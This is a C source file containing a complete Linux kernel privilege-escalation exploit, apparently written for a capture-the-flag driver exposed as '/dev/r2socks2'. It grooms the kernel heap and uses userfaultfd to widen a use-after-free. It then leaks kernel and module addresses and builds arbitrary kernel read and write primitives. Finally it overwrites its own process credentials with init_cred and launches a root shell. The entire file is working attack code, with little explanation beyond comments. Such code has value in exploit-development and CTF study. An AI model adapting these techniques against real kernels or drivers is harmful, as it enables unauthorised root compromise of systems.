#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <unistd.h>
#include "socks.h"
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <poll.h>

#ifdef OLD_KERNEL

#define NO_LLSEEK_OFFSET 0x19abf0L
#define INIT_TASK_OFFSET 0x100f740L
#define MODULE_OFFSET 0x23c8L
#define DEVICE_OFFSET 0x1200L

#else

#define NO_LLSEEK_OFFSET 0x19eba0L
#define INIT_TASK_OFFSET 0x100f740L
#define MODULE_OFFSET 0x23c8L
#define DEVICE_OFFSET 0x1220L


#endif

typedef struct sock_buf {
	size_t size;
	unsigned char *buffer;
	size_t read_index;
	size_t write_index;
	// Inline buffer!
} sock_buf_t;

// int fd1, fd2;

int sock_init(int fd, size_t size) {
	return ioctl(fd, IOCTL_SOCKS_INIT, size);
}

int sock_listen(int fd, char *name) {
	struct sock_name_param param;
	memset(&param, 0, sizeof(param));
	strncpy(param.name, name, sizeof(param.name) -1);
	printf("[*] Trying to listen in %s\n", param.name);

	return ioctl(fd, IOCTL_SOCKS_LISTEN, &param);
}

int sock_connect(int fd, char *name) {
	struct sock_name_param param;
	memset(&param, 0, sizeof(param));
	strncpy(param.name, name, sizeof(param.name) -1);
	printf("[*] Trying to connect to %s\n", param.name);
	return ioctl(fd, IOCTL_SOCKS_CONNECT, &param);
}

int sock_send(int fd, void *buffer, size_t size) {
	struct sock_buffer_param param = { .size = size, .buffer = buffer};
	return ioctl(fd, IOCTL_SOCKS_SEND, &param);
}

int sock_recv(int fd, void *buffer, size_t size) {
	struct sock_buffer_param param = { .size = size, .buffer = buffer};
	return ioctl(fd, IOCTL_SOCKS_RECV, &param);
}

int stop;
char buf[0x1000];

int uaf[10];
int client[10];
int server[10];
int count = 0;

void *uffd_thread_fn( void *args) {

	int uffd = (int)args;
	

	printf("[*] userfaultfd thread running, fd %d\n", uffd);

	for (;;) {
		struct uffd_msg msg;

		struct pollfd pollfd[1];
		pollfd[0].fd = uffd;
		pollfd[0].events = POLLIN;

		// wait for a userfaultfd event to occur
		int pollres = poll(pollfd, 1, 2000);

		if (stop)
			return NULL;

		switch (pollres) {
		case -1:
			perror("poll/userfaultfd");
			continue;
		case 0:
			continue;
		case 1:
			break;
		default:
			fprintf(stderr, "unexpected poll result\n");
			exit(1);
		}

		if (pollfd[0].revents & POLLERR) {
			fprintf(stderr, "pollerr\n");
			exit(1);
		}

		if (!pollfd[0].revents & POLLIN) {
			continue;
		}

		int readres = read(uffd, &msg, sizeof(msg));
		if (readres == -1) {
			if (errno == EAGAIN)
				continue;
			perror("read/userfaultfd");
			exit(1);
		}


		if (readres != sizeof(msg)) {
			fprintf(stderr, "invalid msg size\n");
			exit(1);
		}

		printf("[*] Got userfaultfd message %d \n", msg.event);

		// handle the page fault by copying a page worth of bytes
		if (msg.event & UFFD_EVENT_PAGEFAULT) {
			long long addr = msg.arg.pagefault.address;

			printf("[*] Fault at %llx\n", addr);



			if (count == 0) {
				/* 
				 * First time we just want to leak it, but let's also 
				 * leak the address of a buffer so we can leak it too.
				 */

				/* Resize to 0x100 so we get a uaf on the buffer */
				int resize = ioctl(client[0], IOCTL_SOCKS_RESIZE, 0x100);
				printf("[*] Resize client[%d] said: %d\n", count, resize);

				/* Replace the freed buffer by a sock_t */
				uaf[count] = open("/dev/r2socks2", O_RDONLY);
				printf("[*] Created uaf[%d]\n", count);
				sock_init(uaf[count], 0x80);

				/* 
				 * And put it to listen so we also leak the address of 
				 * the module itself and one of the servers.
				 */

				sock_listen(uaf[count], "uaf0");
			
			} else if (count == 1) {
				/*
				 * Second time we want to smash the data of a connected socket
				 */

				/* Resize to 0x100 so we get a uaf on the buffer */
				int resize = ioctl(server[2], IOCTL_SOCKS_RESIZE, 0x100);
				printf("[*] Resize client[%d] said: %d\n", count, resize);

				/* Replace the freed buffer by a sock_t */
				uaf[count] = open("/dev/r2socks2", O_RDONLY);
				printf("[*] Created uaf[%d]\n", count);

				/* Don't initialize, we'll smash its contents anyway */
			}

			count++;
			
			/* Make a new sock_t  */


			/* We could also connect it so we get more data even? */

			struct uffdio_copy copy;
			copy.src = (long long)buf;
			copy.dst = (long long)addr;
			copy.len = 0x1000;
			copy.mode = 0;
			if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) {
				perror("ioctl/copy");
				exit(1);
			}
		}

	}

	return NULL;
}

void init_userfaultfd(char *map, size_t size) {

	int uffd;
	pthread_t uffd_thread;

	// open the userfault fd
	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (uffd == -1) {
		perror("syscall/userfaultfd");
		exit(1);
	}

	printf("[*] uffd: %d\n", uffd);

	// enable for api version and check features
	struct uffdio_api uffdio_api;
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
		perror("ioctl/uffdio_api");
		exit(1);
	}

	if (uffdio_api.api != UFFD_API) {
		fprintf(stderr, "unsupported userfaultfd api\n");
		exit(1);
	}

	printf("[*] uffd API ok\n");


	// register the pages in the region for missing callbacks
	struct uffdio_register uffdio_register;
	uffdio_register.range.start = (unsigned long)map;
	uffdio_register.range.len = size;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
		perror("ioctl/uffdio_register");
		exit(1);
	}

	if ((uffdio_register.ioctls & UFFD_API_RANGE_IOCTLS) !=
			UFFD_API_RANGE_IOCTLS) {
		fprintf(stderr, "unexpected userfaultfd ioctl set\n");
		exit(1);
	}

	printf("[*] uffd registered\n");


	// start the thread that will handle userfaultfd events
	stop = 0;
	pthread_create(&uffd_thread, NULL, uffd_thread_fn, uffd);

	sleep(1);
}

uint64_t read64(uint64_t addr) {

	/* Place a fake buffer into it */
	uint64_t sock_buf[4];
	sock_buf[0] = 0x10; 	// size
	sock_buf[1] = addr; 	// buffer
	sock_buf[2] = 0x0;		// read_index
	sock_buf[3] = 0x08; 	// write_index = almost full
	int r = sock_send(client[2], sock_buf, sizeof(sock_buf));
	// printf("[*] Send to uaf[0]: %d\n", r);

	uint64_t leak;
	r = sock_recv(uaf[1], &leak, 8);

	/*
	 * Now we need to reset the read/write indeces for uaf[0].
	 * For that, first flush the data we have in it so far.
	 */

	char buf[0x80];
	r = sock_recv(uaf[0], buf, sizeof(buf));
	// printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);

	/* Now place "write_buf" back to 0 */
	r = sock_send(client[2], buf, 0x80-r);
	// printf("[*] Pushed %d bytes to uaf[0] buffer\n" , r);

	/* Now get read_index back to zero too */
	r = sock_recv(uaf[0], buf, sizeof(buf));	
	// printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);


	return leak;
}

void write64(uint64_t addr, uint64_t value) {

	/* Place a fake buffer into it */
	uint64_t sock_buf[4];
	sock_buf[0] = 0x10; 	// size
	sock_buf[1] = addr; 	// buffer
	sock_buf[2] = 0x0;		// read_index
	sock_buf[3] = 0x0; 	// write_index = empty
	int r = sock_send(client[2], sock_buf, sizeof(sock_buf));
	// printf("[*] Send to uaf[0]: %d\n", r);

	// Send to uaf[1] through sever[1]
	r = sock_send(server[1], &value, 8);

	/*
	 * Now we need to reset the read/write indeces for uaf[0].
	 * For that, first flush the data we have in it so far.
	 */

	char buf[0x80];
	r = sock_recv(uaf[0], buf, sizeof(buf));
	// printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);

	/* Now place "write_buf" back to 0 */
	r = sock_send(client[2], buf, 0x80-r);
	// printf("[*] Pushed %d bytes to uaf[0] buffer\n" , r);

	/* Now get read_index back to zero too */
	r = sock_recv(uaf[0], buf, sizeof(buf));	
	// printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);


}

int main(int argc, char const *argv[])
{
	int fd3;

	char *map = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	for(int i=0; i < 0x400 - 0x10; i++) {
		// Open a bunch of size 0 (alloc size 0x20 for all of them)
		int fd = open("/dev/r2socks2", O_RDONLY);
		sock_init(fd, 0x20);
	}
	/* Let's have two socks */

	printf("[*] Creating server0\n");
	server[0] = open("/dev/r2socks2", O_RDONLY);
	sock_init(server[0], 0x80);
	sock_listen(server[0], "socket0");	

	printf("[*] Creating server1\n");
	server[1] = open("/dev/r2socks2", O_RDONLY);
	sock_init(server[1], 0x80);
	sock_listen(server[1], "socket1");

	printf("[*] Creating server2\n");
	server[2] = open("/dev/r2socks2", O_RDONLY);
	sock_init(server[2], 0x80);
	sock_listen(server[2], "socket2");	

	printf("[*] Creating client0\n");
	client[0] = open("/dev/r2socks2", O_RDONLY);
	sock_init(client[0], 0x80);
	sock_connect(client[0], "socket0");

	client[1] = open("/dev/r2socks2", O_RDONLY);
	

	/* 
	 * This is our layout now:
	 *  ... s0 bs0 s1 bs1 s2 bs2 c0 bc0 c1 ...
	 */


	char buf1[0x40] = {0x41};
	char buf2[0x40] = {0};

	init_userfaultfd(map, 0x2000);

	/* Prefill buffer with some data so we can read back */
	sock_send(server[0], buf1, 0x70);
	/*
	 *  Do an unaligned read so we leak as much as possible
	 * client[0] buffer gets freed and replaced by a sock_buf_t (for uaf[0])
	 */

	int x = sock_recv(client[0], map + 1, 0x70);


	/*
	 * Our layout now is:
	 * ... s0 bs0 s1 bs1 s2 bs2 c0 u0 c1 bu0 ...
	 *
	 * And we can leak data off u0.
	 */
	uint64_t uaf0_listen_next = *(uint64_t *)(map + 1 + 8);
	uint64_t uaf0_listen_prev = *(uint64_t *)(map + 1 + 16);
	/* This must be s2 */
	printf("[*] uaf[0]->listening.next : %lx\n", uaf0_listen_next);
	/* This must be in the module address space */
	
	printf("[*] uaf[0]->listening.prev : %lx\n", uaf0_listen_prev);

	uint64_t s2_sock = uaf0_listen_next - 8;
	uint64_t s2_buf_data = s2_sock + 0x80;
	uint64_t module_list = uaf0_listen_prev;

	uint64_t module = module_list - MODULE_OFFSET;
	uint64_t sock_fop = module + DEVICE_OFFSET;

	uint64_t uaf0_sock = s2_sock + 0x180;

	/* This is the sock_buf_t in the kmalloc-32 heap */
	uint64_t uaf0_buf = *(uint64_t *)(map + 1 + 0x28);
	printf("[*] uaf[0]->sock->buf : %lx\n", uaf0_buf);

	// exit(0);

	/*
	 * At this stage we'll try to smash a sock_t and point it's buffer
	 * to a controllable location.
	 *
	 * We choose the uaf0 buffer data because we can just write to it
	 * at any time.
	 */

	uint64_t uaf0_buf_data = uaf0_sock + 0x100;

	/*
	 * Prepare a sock_buf_t in buf for the smash.
	 */
	 
	*(uint64_t *)(buf + 0x00) = 0; 				 // spinlock	
	*(uint64_t *)(buf + 0x08) = s2_buf_data + 8; // listening.next
	*(uint64_t *)(buf + 0x10) = s2_buf_data + 8; // listening.prev
	*(uint64_t *)(buf + 0x18) = 1;  		 	 // state = INITIALIZED
	*(uint64_t *)(buf + 0x20) = 0; 			   	 // peer = none
	*(uint64_t *)(buf + 0x28) = uaf0_buf_data; 	 // buf

	/*
	 * We want uaf[1] to be on top of server[2] data
	 * such that the empty list above makes sense.
	 */

	sock_init(client[1], 0x80);
	sock_connect(client[1], "socket2");


	/*
	 * Send through client[1] to cause uaf on server[2].
	 */
	int read1 = sock_send(client[1], map + 0x1000, 0x30);
	printf("[*] sock_send: %d\n", read1);

	printf("[*] At map+0x1000: %lx\n", *(uint64_t *)(map + 0x1000));
	printf("[*] At map+0x1008: %lx\n", *(uint64_t *)(map + 0x1008));
	printf("[*] At map+0x1010: %lx\n", *(uint64_t *)(map + 0x1010));
	printf("[*] At map+0x1018: %lx\n", *(uint64_t *)(map + 0x1018));
	printf("[*] At map+0x1020: %lx\n", *(uint64_t *)(map + 0x1020));

	/* 
	 * Now uaf[1] has a socket that points into uaf[0]'s in-flight data.
	 * We can now make a client to connect to uaf0.
	 */

	client[2] = open("/dev/r2socks2", O_RDONLY);
	sock_init(client[2], 0x80);
	int r = sock_connect(client[2], "uaf0");
	printf("[*] Connect to uaf0: %d", r);

	/* We also connect uaf[1] to server[1] so we can send/recv data through it */
	sock_connect(uaf[1], "socket1");

	/* Now we are ready for read64/write64 */

	uint64_t no_llseek = read64(sock_fop + 8);
	printf("[*] no_llseek = 0x%lx\n", no_llseek);

	uint64_t kbase = no_llseek - NO_LLSEEK_OFFSET;

	printf("[*] Kernel base = 0x%llx\n", kbase);

	uint64_t init_task = kbase + INIT_TASK_OFFSET;

#define COMM 0x570
#define CRED 0x560
#define TASKS 0x2c8

	// for (int i =0; i < 2000; i+=8) {
	// 	printf("[*] init_task + 0x%.3x %lx\n", i, read64(init_task + i));

	// }

	char buf[17] = {0};

	uint64_t current = init_task;

	uint64_t init_cred = read64(init_task + CRED);

	do {

	// for (int x = 0; x < 2; x++) {
		*(uint64_t *)&buf[0] = read64(current + COMM);
		*(uint64_t *)&buf[8] = read64(current + COMM + 8);

		// printf("[*] Task: %s\n", buf);

		if (strcmp(buf, "exploit") == 0) {
			// printf("[*] Found exploit :)\n");
			break;
		}

		current = read64(current + TASKS) - TASKS;
	} while (current != init_task);


	if (current == init_task ) {
		printf("[*] Failed to find ourselves...\n");
		exit(0);
	}


	// TODO: Find task and pwn!
	// printf("[*] init_task + ...: %lx\n", read64(init_task + 728 - 8));
	// printf("[*] init_task + 728: %lx\n", read64(init_task + 728));
	// printf("[*] init_task + ...: %lx\n", read64(init_task + 728 + 8 ));
	// printf("[*] init_task + ...: %lx\n", read64(init_task + 728 + 16 ));
	// printf("[*] init_task + ...: %lx\n", read64(init_task + 728 + 24 ));

	write64(current + CRED, init_cred);
	write64(current + CRED + 8, init_cred);

	printf("[*] We are: %d\n", getuid());

	char *args[] = {"/bin/sh", NULL};
	execve("/bin/sh", args, NULL);

	/* code */
	return 0;
}